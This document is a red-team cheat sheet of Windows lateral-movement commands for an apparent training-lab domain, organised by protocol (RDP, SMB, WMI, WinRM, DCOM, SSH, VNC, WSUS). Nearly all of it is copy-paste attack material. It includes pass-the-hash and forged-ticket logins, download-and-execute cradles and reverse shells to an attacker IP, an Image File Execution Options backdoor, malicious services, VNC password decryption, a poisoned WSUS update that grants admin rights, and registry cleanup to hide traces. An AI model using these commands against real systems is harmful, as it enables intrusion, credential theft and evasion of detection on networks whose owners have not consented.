
---
---

> RDP - Port 3389

```c
# Scan network for RDP (default port 3389)
nmap -p 3389 10.129.229.0/24

# Test RDP credentials across subnet
netexec rdp 10.129.229.0/24 -u helen -p 'RedRiot88' -d inlanefreight.local
# (Pwn3d!) means valid login but not necessarily admin

# Launch native RDP client on Windows
mstsc.exe

# Connect from Linux with drive mapping
xfreerdp /u:Helen /p:'RedRiot88' /d:inlanefreight.local /v:10.129.229.244 /dynamic-resolution /drive:.,linux

# Optimize for low bandwidth / proxy usage
xfreerdp /u:Helen /p:'RedRiot88' /d:inlanefreight.local /v:10.129.229.244 /dynamic-resolution /drive:.,linux \
/bpp:8 /compression -themes -wallpaper /clipboard /audio-mode:0 /auto-reconnect -glyph-cache

# Check if Restricted Admin Mode is enabled
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin

# Enable Restricted Admin Mode (0 = enabled)
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 0 /t REG_DWORD

# Disable Restricted Admin Mode (1 = disabled)
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 1 /t REG_DWORD

# Start reverse chisel server on attacker
./chisel server --reverse

# Connect from target to attacker SOCKS proxy
chisel.exe client <VPN_IP>:8080 R:socks

# Proxychains config for SOCKS proxy
socks5 127.0.0.1 1080

# RDP using NTLM hash instead of password
proxychains4 -q xfreerdp /u:helen /pth:62EBA30320E250ECA185AA1327E78AEB /d:inlanefreight.local /v:172.20.0.52

# Create sacrificial process for ticket injection
Rubeus.exe createnetonly /program:powershell.exe /show

# Forge + inject TGT ticket using NTLM hash
Rubeus.exe asktgt /user:helen /rc4:62EBA30320E250ECA185AA1327E78AEB /domain:inlanefreight.local /ptt

# Connect to RDP with Restricted Admin
mstsc.exe /restrictedAdmin

# Execute remote PowerShell payload over RDP without GUI
SharpRDP.exe computername=srv01 command="powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.207/s')" username=inlanefreight\helen password=RedRiot88
# Limit: 259 characters; leaves RunMRU registry artifacts

# Download CleanRunMRU source code
wget -Uri http://10.10.14.207/CleanRunMRU/CleanRunMRU/Program.cs -OutFile CleanRunMRU.cs

# Compile CleanRunMRU with built-in C# compiler
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe .\CleanRunMRU.cs

# Run to clear RunMRU registry values
CleanRunMRU.exe clearall
```

> SMB - 139,445

```c
# ==========================
# SMB Lateral Movement - Windows Tools
# ==========================

# Connect to SRV01 via RDP before running Windows-based tools
xfreerdp /u:Helen /p:'RedRiot88' /d:inlanefreight.local /v:10.129.229.244 /dynamic-resolution /drive:.,linux

# PsExec interactive shell as user
PsExec.exe \\SRV02 -i -u INLANEFREIGHT\helen -p RedRiot88 cmd

# PsExec SYSTEM shell
PsExec.exe \\SRV02 -i -s -u INLANEFREIGHT\helen -p RedRiot88 cmd

# Start listener for SharpNoPSExec reverse shell
nc -lnvp 8080

# Execute payload via SharpNoPSExec using existing service
SharpNoPSExec.exe --target=172.20.0.52 --payload="c:\windows\system32\cmd.exe /c powershell -exec bypass -nop -e <base64payload>"

# Start listener for NimExec reverse shell
nc -lvnp 8080

# Execute payload via NimExec with password auth
NimExec.exe -u helen -d inlanefreight.local -p RedRiot88 -t 172.20.0.52 -c "cmd.exe /c powershell -e <base64payload>" -v

# Host payload over SMB for reg.exe method
sudo python3 smbserver.py share -smb2support /path/to/nc.exe

# Start listener for reg.exe reverse shell
nc -lnvp 8080

# Add IFEO debugger key for msedge.exe to trigger payload
reg.exe add "\\srv02.inlanefreight.local\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msedge.exe" /v Debugger /t reg_sz /d "cmd /c copy \\\\172.20.0.99\\share\\nc.exe && nc.exe -e cmd.exe 172.20.0.99 8080"

# Allow guest SMB access if needed
reg.exe add HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /v AllowInsecureGuestAuth /d 1 /t REG_DWORD /f


# ==========================
# SMB Lateral Movement - Linux Tools
# ==========================

# Scan SMB ports (139, 445)
proxychains4 -q nmap 172.20.0.52 -sV -sC -p139,445 -Pn

# psexec.py for remote shell
proxychains4 -q psexec.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52

# smbexec.py for remote shell
proxychains4 -q smbexec.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52

# List services with services.py
proxychains4 -q services.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 list

# Create new reverse shell service
proxychains4 -q services.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 create -name 'Service Backdoor' -display 'Service Backdoor' -path "\\\\10.10.14.207\\share\\rshell.exe"

# Start listener for new service
nc -lnvp 9001

# Start the new service
proxychains4 -q services.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 start -name 'Service Backdoor'

# Delete the service
proxychains4 -q services.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 delete -name 'Service Backdoor'

# Modify existing service (Spooler) to run payload
proxychains4 -q services.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 change -name Spooler -path "\\\\10.10.14.207\\share\\rshell.exe" -start_type 2

# Start modified Spooler service
proxychains4 -q services.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 start -name Spooler

# Start listener for atexec reverse shell
nc -lnvp 8080

# Execute payload with atexec.py via Task Scheduler
proxychains4 -q atexec.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 "powershell -e <base64payload>"
```

 > WMI - 135 , 49152-65535
 
```c
# WMI Lateral Movement — Windows tools first, then Linux tools
# (Short notes only; commands are copy-paste ready)

# -----------------------------
# WINDOWS TOOLS
# -----------------------------

# Get OS info from remote host (WMIC)
wmic /node:172.20.0.52 os get Caption,CSDVersion,OSArchitecture,Version

# Get OS info from remote host (PowerShell)
Get-WmiObject -Class Win32_OperatingSystem -ComputerName 172.20.0.52 | Select-Object Caption,CSDVersion,OSArchitecture,Version

# Start a process remotely (WMIC)
wmic /node:172.20.0.52 process call create "notepad.exe"

# Start a process remotely (PowerShell)
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "notepad.exe" -ComputerName 172.20.0.52

# WMIC with explicit credentials
wmic /user:username /password:password /node:172.20.0.52 os get Caption,CSDVersion,OSArchitecture,Version

# PowerShell with explicit credentials
$credential = New-Object System.Management.Automation.PSCredential("username", (ConvertTo-SecureString "password" -AsPlainText -Force));
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "notepad.exe" -ComputerName 172.20.0.52 -Credential $credential

# Execute reverse shell payload (PowerShell + WMI)
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.207/s')" -ComputerName 172.20.0.52

# Note: WMIC utility is deprecated; prefer PowerShell for WMI. WMI itself is not deprecated.


# -----------------------------
# LINUX TOOLS
# -----------------------------

# Scan WMI ports (135 + dynamic 49152-65535)
# WMI initial bind on 135, uses dynamic high ports for RPC
nmap -p135,49152-65535 10.129.229.244 -sV

# Test WMI credentials (no pivot)
# Tip: "(Pwn3d!)" means remote WMI exec is allowed; without it = creds valid but no exec
netexec wmi 10.129.229.244 -u helen -p RedRiot88

# Test WMI with pivot (use proxychains; set up chisel SOCKS first if needed)
proxychains4 -q netexec wmi 172.20.0.52 -u helen -p RedRiot88

# Optional: RDP into SRV01 from Linux to run Windows tools interactively
xfreerdp /u:Helen /p:'RedRiot88' /d:inlanefreight.local /v:10.129.229.244 /dynamic-resolution /drive:.,linux

# Install Linux wmic client (Debian-based)
sudo apt-get install wmi-client

# Query OS info with Linux wmic
wmic -U inlanefreight.local/helen%RedRiot88 //172.20.0.52 "SELECT Caption, CSDVersion, OSArchitecture, Version FROM Win32_OperatingSystem"

# Execute command via wmiexec.py (retrieves output over SMB 445)
wmiexec.py inlanefreight/helen:RedRiot88@172.20.0.52 whoami

# If SMB 445 is blocked for output retrieval, run with no output
wmiexec.py inlanefreight/helen:RedRiot88@172.20.0.52 whoami -nooutput

# Run a WMI query with NetExec
proxychains4 -q netexec wmi 172.20.0.52 -u helen -p RedRiot88 --wmi "SELECT * FROM Win32_OperatingSystem"

# Execute a command with NetExec (output over WMI, not SMB)
proxychains4 -q netexec wmi 172.20.0.52 -u helen -p RedRiot88 -x whoami
```

> Winrm - 5985,5986,47001

```c
# ==========================
# WinRM Lateral Movement — Windows Tools
# ==========================

# Scan for WinRM ports (HTTP 5985, HTTPS 5986)
nmap -p5985,5986 10.129.229.244 -sCV

# Test WinRM credentials with NetExec
netexec winrm 10.129.229.244 -u frewdy -p Kiosko093

# Connect via RDP to SRV01 (optional interactive session)
xfreerdp /u:Helen /p:'RedRiot88' /d:inlanefreight.local /v:10.129.229.244 /dynamic-resolution /drive:.,linux

# Run PowerShell command remotely with current user
Invoke-Command -ComputerName srv02 -ScriptBlock { hostname; whoami }

# Run PowerShell command remotely with explicit credentials
$username = "INLANEFREIGHT\Helen"
$password = "RedRiot88"
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword)
Invoke-Command -ComputerName 172.20.0.52 -Credential $credential -ScriptBlock { whoami; hostname }

# Run PowerShell command remotely with Negotiate authentication (IP address)
Invoke-Command -ComputerName 172.20.0.52 -Authentication Negotiate -ScriptBlock { hostname }

# Run command using Windows Remote Shell (winrs)
winrs -r:srv02 "powershell -c whoami;hostname"

# Run winrs with explicit credentials
winrs /remote:srv02 /username:helen /password:RedRiot88 "powershell -c whoami;hostname"

# Copy file to remote host via PSSession
$sessionSRV02 = New-PSSession -ComputerName SRV02 -Credential $credential
Copy-Item -ToSession $sessionSRV02 -Path 'C:\Users\helen\Desktop\Sample.txt' -Destination 'C:\Users\helen\Desktop\Sample.txt' -Verbose

# Copy file from remote host via PSSession
Copy-Item -FromSession $sessionSRV02 -Path 'C:\Windows\System32\drivers\etc\hosts' -Destination 'C:\Users\helen\Desktop\host.txt' -Verbose

# Get interactive PowerShell shell on remote host
Enter-PSSession $sessionSRV02

# --------------------------
# Pass-the-Ticket with WinRM (using Rubeus)
# --------------------------

# Forge TGT using NTLM hash
.\Rubeus.exe asktgt /user:leonvqz /rc4:3223DS033D176ABAAF6BEAA0AA681400 /nowrap

# Create sacrificial netonly process for ticket import
.\Rubeus.exe createnetonly /program:powershell.exe /show

# Import forged ticket into sacrificial process
.\Rubeus.exe ptt /ticket:BASE64_TICKET

# Enter PSSession using Kerberos Negotiate auth
Enter-PSSession SRV02.inlanefreight.local -Authentication Negotiate

# --------------------------
# Troubleshooting
# --------------------------

# Add all hosts to WinRM TrustedHosts
Set-Item WSMan:localhost\client\trustedhosts -value * -Force

# Use FQDN instead of short name to avoid Kerberos/Negotiate errors
Enter-PSSession srv02.inlanefreight.local


# ==========================
# WinRM Lateral Movement — Linux Tools
# ==========================

# Execute CMD command via NetExec WinRM module
netexec winrm 10.129.229.244 -u frewdy -p Kiosko093 -x "ipconfig"

# Execute PowerShell command via NetExec (-X)
netexec winrm 10.129.229.244 -u frewdy -p Kiosko093 -X "Get-Process"

# Install Ruby on Debian-based system
sudo apt-get install ruby

# Install Evil-WinRM
sudo gem install evil-winrm

# Connect to target using Evil-WinRM
evil-winrm -i 10.129.229.244 -u 'inlanefreight.local\frewdy' -p Kiosko093

# Connect with script path loaded
evil-winrm -i 10.129.229.244 -u 'inlanefreight.local\frewdy' -p Kiosko093 -s '/home/plaintext/'

# Inside Evil-WinRM, run menu to see available modules
menu

# Example: load PowerView.ps1 inside Evil-WinRM
PowerView.ps1

# --------------------------
# PowerShell Web Access
# --------------------------

# Access via browser (HTTPS default)
# https://10.129.229.244/pswa

# Faster file retrieval with Base64 encoding
[Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Windows\System32\drivers\etc\hosts"))

# Decode Base64 output in Linux
cat hosts_base64.txt | base64 -d > hosts

# Run PowerView in PSWA with explicit credentials
$username = "INLANEFREIGHT\Helen"
$password = "RedRiot88"
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword)
Get-DomainUser -Credential $credential -FindOne
```

> DCOM, 135, 49152-65535

```c
# ===============================
# DCOM (Distributed Component Object Model)
# Port 135 + Dynamic 49152-65535
# ===============================

# --- ENUMERATION (Nmap) ---
nmap -p135,49152-65535 10.129.229.244 -sCV -Pn    # Scan for DCOM (TCP 135 + high ports)

# --- WINDOWS: MMC20.Application RCE ---
# Start listener on attacker machine
nc -lnvp 8001                                     # Listening for reverse shell

# Connect to SRV01 via RDP (Helen creds)
xfreerdp /u:Helen /p:'RedRiot88' /d:inlanefreight.local /v:10.129.229.244 /dynamic-resolution /drive:.,linux

# Create MMC20.Application COM object to SRV02
$mmc = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","172.20.0.52"))

# Execute reverse shell payload via ExecuteShellCommand
$mmc.Document.ActiveView.ExecuteShellCommand("powershell.exe",$null,"-e <BASE64_PAYLOAD>",0)

# --- WINDOWS: ShellWindows / ShellBrowserWindow RCE ---
# Find CLSID for ShellWindows
Get-ChildItem -Path 'HKLM:\SOFTWARE\Classes\CLSID' | ForEach-Object { Get-ItemProperty -Path $_.PSPath | Where-Object {$_.'(default)' -eq 'ShellWindows'} | Select-Object -ExpandProperty PSChildName }
# Example CLSID: {9BA05972-F6A8-11CF-A442-00A0C90A8F39}

# Instantiate ShellWindows object remotely
$shell = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","172.20.0.52"))

# Start listener
nc -lnvp 8080

# Execute reverse shell payload via ShellExecute
$shell[0].Document.Application.ShellExecute("cmd.exe","/c powershell -e <BASE64_PAYLOAD>","C:\Windows\System32",$null,0)

# --- LINUX: Impacket dcomexec.py ---
# Start listener
nc -lnvp 8080

# Execute MMC20.Application payload over DCOM
proxychains4 -q python3 dcomexec.py -object MMC20 INLANEFREIGHT/Josias:Jonny25@172.20.0.52 "powershell -e <BASE64_PAYLOAD>" -silentcommand

# If SMB/port 445 blocked (no output mode)
proxychains4 -q python3 dcomexec.py -object MMC20 INLANEFREIGHT/Josias:Jonny25@172.20.0.52 "powershell -e <BASE64_PAYLOAD>" -no-output

# Note: Replace MMC20 with ShellWindows or ShellBrowserWindow if available
```

> SSH 

```c
# Scan for SSH (default port 22)
nmap -p 22 10.129.229.0/24

# Test SSH credentials from Windows
netexec ssh 10.129.229.244 -u helen -p 'RedRiot88'

# Test SSH with private key from Windows
ssh -i C:\path\to\helen_id_rsa helen@10.129.229.244

# Check private key file permissions (Windows)
icacls C:\path\to\helen_id_rsa

# Copy private key to user-owned folder (Windows)
copy C:\helen_id_rsa C:\Users\Ambioris\

# Connect to SSH from Windows with domain account
ssh helen@inlanefreight.local@SRV01

# Transfer file from Windows to remote via SCP
scp C:\path\to\file.txt helen@10.129.229.244:/tmp/

# Transfer file from remote to Windows via SCP
scp helen@10.129.229.244:/tmp/file.txt C:\path\to\

# Scan for SSH (Linux)
nmap -p 22 10.129.229.0/24

# Test SSH credentials from Linux
netexec ssh 10.129.229.244 -u helen -p 'RedRiot88'

# Connect from Linux with password
ssh helen@10.129.229.244

# Connect from Linux with private key
ssh -i ~/helen_id_rsa helen@10.129.229.244

# Transfer file from Linux to remote
scp file.txt helen@10.129.229.244:/tmp/

# Transfer file from remote to Linux
scp helen@10.129.229.244:/tmp/file.txt .

# Enumerate SSH server version
ssh -v helen@10.129.229.244

# Use SSH for local port forwarding (Linux)
ssh -L 8080:localhost:80 helen@10.129.229.244

# Use SSH for dynamic SOCKS proxy (Linux)
ssh -D 1080 helen@10.129.229.244
```

> Remote Managment Tools - AnyDisk , TeamViewer , VNC

```c
# =============================
# Remote Management Tools - AnyDesk, TeamViewer, VNC
# =============================

# --- Scan for VNC (Default Port 5900) ---
nmap -p 5900 172.20.0.0/24

# --- Check VNC port on target Windows host ---
Test-NetConnection -ComputerName SRV02 -Port 5900

# --- Search for TightVNC registry keys (Windows) ---
reg query HKLM\SOFTWARE\TightVNC\Server /s

# Example output:
# Password    REG_BINARY    816ECB5CE758EAAA

# --- Decrypt TightVNC password (Linux) ---
echo -n 816ECB5CE758EAAA | xxd -r -p | \
openssl enc -des-cbc --nopad --nosalt \
-K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv

# Example output:
# VNCFake1

# --- Connect to VNC from Windows using TightVNC Viewer ---
# 1. Open TightVNC Viewer
# 2. Set Remote Host: SRV02
# 3. Enter password: VNCFake1

# --- Install TightVNC Viewer on Linux ---
sudo apt-get install xtightvncviewer tightvncpasswd

# --- Connect from Linux with password ---
echo VNCFake1 | proxychains4 -q vncviewer 172.20.0.52 -autopass

# --- Connect from Linux with slow link optimizations ---
echo VNCFake1 | proxychains4 -q vncviewer 172.20.0.52 -autopass \
-quality 0 -nojpeg -compresslevel 1 \
-encodings "tight hextile" -bgr233

# --- Interact with VNC session ---
# Press F8 in VNC Viewer for menu options

# =============================
# Notes:
# - VNC default port: 5900
# - Only the console session is viewable
# - Credentials may be reused across machines
# - MITRE ATT&CK T1021.005 covers VNC for lateral movement
# =============================
```

> WSUS

```c
# --- WSUS (Windows Server Update Services) Lateral Movement ---

# --- ENUMERATION ---
# Check if WSUS server configured on target
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
# Example output: http://wsus.inlanefreight.local:8530

# Locate WSUS server using SharpWSUS
SharpWSUS.exe locate

# Inspect WSUS server for details (run as Administrator)
SharpWSUS.exe inspect
# Lists: server info, managed computers, groups, downstream servers

# --- RDP to WSUS server (if creds available) ---
xfreerdp /u:filiplain /p:'Password1' /d:inlanefreight.local /v:<WSUS_IP>

# --- CREATING MALICIOUS PATCH ---
# Use signed Microsoft binary (e.g., PSExec64.exe) for payload
# This example adds 'filiplain' to Administrators group
SharpWSUS.exe create /payload:"C:\Tools\sysinternals\PSExec64.exe" \
/args:"-accepteula -s -d cmd.exe /c net localgroup Administrators filiplain /add" \
/title:"NewAccountUpdate"

# --- APPROVE MALICIOUS PATCH ---
SharpWSUS.exe approve /updateid:<UPDATE_ID> /computername:srv01.inlanefreight.local /groupname:"FastUpdates"

# Confirm group creation and approval
SharpWSUS.exe inspect

# --- MANUAL APPROVAL (GUI) ---
# WSUS Console -> All Updates -> NewAccountUpdate -> Approve
# Select target group (e.g., All Computers) -> Approved for Install -> OK

# --- FIXING DOWNLOAD ERRORS ---
# Check Event Viewer for WSUS Event ID 364 (download failed)
Get-WinEvent -LogName Application | Where-Object { $_.Id -eq 364 } | fl

# Copy payload to expected WSUS content path
copy C:\Tools\sysinternals\PSExec64.exe C:\WSUS\WsusContent\<SUBDIR>\<EXPECTED_FILENAME>.exe

# Retry download in WSUS console

# --- FORCE INSTALL ON CLIENT ---
# From target client: Check for updates manually in Windows Update
# Or wait for scheduled update cycle

# --- VERIFY PATCH SUCCESS ---
SharpWSUS.exe check /updateid:<UPDATE_ID> /computername:srv01.inlanefreight.local

# --- POST-EXPLOIT ---
# Verify admin group membership
net localgroup administrators

# --- CLEANUP ---
SharpWSUS.exe delete /updateid:<UPDATE_ID> /computername:srv02.inlanefreight.local

# --- ALT TOOLS ---
# WSUSpendu (PowerShell) – inject malicious updates
# Thunder_Woosus (C#) – manipulate WSUS updates
# No Linux-only tooling for WSUS abuse (gap in tooling)

# --- NOTES ---
# - Requires WSUS Admin or Local Admin on WSUS server
# - WSUS executes only Microsoft-signed binaries
# - SharpWSUS automates payload creation, approval, and cleanup
# - Manual GUI method needed if automation fails
```
---
---
